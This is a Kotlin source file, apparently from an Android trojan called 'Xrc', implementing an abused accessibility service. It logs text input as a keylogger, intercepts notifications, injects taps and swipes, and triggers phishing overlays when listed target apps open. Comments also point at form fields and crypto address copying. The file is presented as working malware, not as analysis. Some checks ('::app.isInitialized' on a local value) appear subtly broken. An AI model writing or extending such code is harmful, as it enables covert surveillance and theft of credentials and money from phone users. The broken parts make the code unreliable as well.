// ============================================================
// FILE: android/app/src/main/java/com/xrc/xrc/XrcAccessibilityService.kt
// ============================================================
package com.xrc.xrc

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.xrc.XrcApplication
import com.xrc.sensors.Keylogger
import com.xrc.sensors.NotificationInterceptor
import com.xrc.vnc.TouchInjector

/**
 * XrcAccessibilityService — core accessibility service.
 *
 * Provides:
 * - Keylogging (view text changes)
 * - Notification interception
 * - Touch injection via gesture dispatch
 * - Screen content reading
 * - Auto-click capabilities
 * - Window change detection for overlay injection
 *
 * This is the backbone service that enables most features.
 */
class XrcAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "XrcA11ySvc"

        var instance: XrcAccessibilityService? = null
            private set
    }

    private val keylogger = Keylogger()
    private val notificationInterceptor = NotificationInterceptor()
    private var isActive = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        isActive = true
        Log.i(TAG, "Accessibility service connected")

        // Register with ServiceLocator for touch injection
        val app = application as XrcApplication
        if (::app.isInitialized) {
            app.serviceLocator.accessibilityService = this

            // Connect touch injector to this service
            app.serviceLocator.touchInjector.setAccessibilityService(this)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isActive) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Keylogging
                keylogger.processEvent(event)
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                // Notification interception
                notificationInterceptor.processEvent(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Window change detection for overlay/trigger
                onWindowChanged(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Content change — could be form fields
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // View clicked — could be crypto address copy
            }
        }
    }

    override fun onInterrupt() {
        isActive = false
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isActive = false
        instance = null
        Log.i(TAG, "Accessibility service destroyed")
    }

    override fun onKeyEvent(event: KeyEvent): Boolean {
        Log.d(TAG, "Key event: ${event.keyCode}")
        return super.onKeyEvent(event)
    }

    /**
     * Perform a gesture using the accessibility gesture API.
     */
    fun performGesture(path: Path, durationMs: Long): Boolean {
        val stroke = GestureDescription.StrokeDescription(path, 0, durationMs)
        val gesture = GestureDescription.Builder()
            .addStroke(stroke)
            .build()
        return dispatchGesture(gesture, null, null)
    }

    /**
     * Tap at coordinates via accessibility gesture.
     */
    fun gestureTap(x: Int, y: Int): Boolean {
        val path = Path().apply {
            moveTo(x.toFloat(), y.toFloat())
            lineTo(x.toFloat(), y.toFloat())
        }
        return performGesture(path, 100L)
    }

    /**
     * Swipe via accessibility gesture.
     */
    fun gestureSwipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Long = 300L): Boolean {
        val path = Path().apply {
            moveTo(x1.toFloat(), y1.toFloat())
            lineTo(x2.toFloat(), y2.toFloat())
        }
        return performGesture(path, durationMs)
    }

    /**
     * Get keylogger instance.
     */
    fun getKeylogger(): Keylogger = keylogger

    /**
     * Get notification interceptor.
     */
    fun getNotificationInterceptor(): NotificationInterceptor = notificationInterceptor

    /**
     * Check if service is active.
     */
    fun isActive(): Boolean = isActive

    private fun onWindowChanged(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""

        Log.d(TAG, "Window change: $pkg / $className")

        val app = application as XrcApplication
        if (::app.isInitialized && app.serviceLocator.config.features.syringe_enabled) {
            val targetApps = app.serviceLocator.config.syringe.target_apps
            if (pkg in targetApps) {
                Log.i(TAG, "Target app in foreground: $pkg")
                // Trigger could inject overlay here
                app.serviceLocator.syringeEngine.injectOverlay(pkg)
            }
        }
    }
}
